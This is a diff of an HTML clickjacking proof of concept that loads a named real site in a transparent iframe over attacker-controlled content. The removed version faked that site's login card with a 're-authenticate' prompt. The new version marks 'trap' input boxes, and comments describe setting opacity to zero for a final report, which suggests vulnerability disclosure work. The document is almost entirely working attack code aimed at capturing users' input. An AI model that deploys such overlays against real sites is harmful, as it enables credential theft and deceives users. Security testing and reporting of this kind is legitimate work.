@@ -2,50 +2,40 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Verification - Sentiyo</title>
+    <title>PoC - Transparent Overlay</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #000; }
 
-        /* LAYER 1: The REAL site (Invisible but clickable) */
+        /* LAYER 1: The REAL site (Invisible but active) */
         .victim-frame { 
             position: absolute;
             top: 0; left: 0;
             width: 100vw; height: 100vh;
             border: none;
-            z-index: 10; /* Sits on top */
-            opacity: 0.1; /* Set to 0.1 to align, then 0.0 for the final PoC */
+            z-index: 2;
+            /* Start at 0.3 to align the boxes, then change to 0.0 for the final report */
+            opacity: 0.3; 
         }
 
-        /* LAYER 2: The FAKE UI (What the user sees) */
-        .attacker-ui {
+        /* LAYER 2: The Clear "Trap" Inputs */
+        .attacker-layer {
             position: absolute;
             top: 0; left: 0;
             width: 100vw; height: 100vh;
-            background: #121212; /* Match their dark theme exactly */
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 1; /* Sits underneath */
+            z-index: 1;
         }
 
-        .fake-login-card {
-            background: #1e1e1e;
-            padding: 40px;
-            border-radius: 8px;
-            text-align: center;
-            color: white;
-            width: 380px;
-        }
-
-        /* Mirror their exact CSS styles here */
-        .fake-input { 
-            background: #2b2b2b; border: 1px solid #444; color: white;
-            padding: 12px; margin: 10px 0; width: 300px; border-radius: 4px;
-        }
-        .fake-btn { 
-            background: #ff9800; color: black; font-weight: bold;
-            padding: 12px; width: 325px; border-radius: 4px; border: none;
+        .clear-input {
+            width: 320px; /* Match width of Sentiyo inputs */
+            height: 45px; /* Match height of Sentiyo inputs */
+            margin: 10px 0;
+            background: rgba(255, 255, 255, 0.9); /* High clarity white */
+            border: 2px solid #ff9800; /* Orange border to show where the "trap" is */
+            border-radius: 4px;
         }
     </style>
 </head>
@@ -53,16 +43,8 @@
 
     <iframe src="https://aws.sentiyo.com" class="victim-frame"></iframe>
 
-    <div class="attacker-ui">
-        <div class="fake-login-card">
-            <h1 style="font-size: 24px;">Sentiyo</h1>
-            <p style="color: #aaa;">Please re-authenticate to continue</p>
-            <div class="fake-input">Email or Username</div>
-            <div class="fake-input">Password</div>
-            <div class="fake-btn">Login</div>
-            <p style="color: #ff9800; font-size: 12px; margin-top: 15px;">Forgot your password?</p>
-        </div>
-    </div>
+    <div class="attacker-layer">
+        <div class="clear-input"></div> <div class="clear-input"></div> </div>
 
 </body>
 </html>
